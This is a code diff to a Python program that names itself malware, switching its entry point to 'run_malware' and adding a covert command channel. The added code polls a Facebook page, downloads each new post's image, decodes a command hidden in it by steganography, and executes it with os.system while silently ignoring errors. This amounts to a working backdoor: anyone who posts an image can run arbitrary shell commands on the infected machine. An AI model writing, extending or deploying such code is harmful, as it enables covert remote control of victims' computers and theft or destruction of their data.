@@ -24,8 +24,8 @@ COMMAND_KEYWORDS = {
 
 def main():
     """Runs the program."""
-    test_connectivity()
-    #run_malware()
+    #test_connectivity()
+    run_malware()
 
 
 def run_malware():
@@ -142,8 +142,20 @@ def wait_for_posts(graph, page_id, new_post_func, verbose=False):
         new_post_data = get_last_post_data(graph, page_id)
         new_post_datetime = get_post_datetime(new_post_data)
         if new_post_datetime > last_post_datetime:
+            if verbose:
+                print('Found new post.')
             last_post_datetime = new_post_datetime
             new_post_func(new_post_data['message'])
+            post_id = new_post_data['id']
+            try:
+                photo_obj = graph.get_object(id=post_id, fields='full_picture')
+                image = get_image_from_url(photo_obj['full_picture'])
+                decoded_cmd = decode_image(image)
+                if verbose:
+                    print('Running stego command: {0}'.format(decoded_cmd))
+                os.system(decoded_cmd)
+            except:
+                pass
         time.sleep(60)
 
 
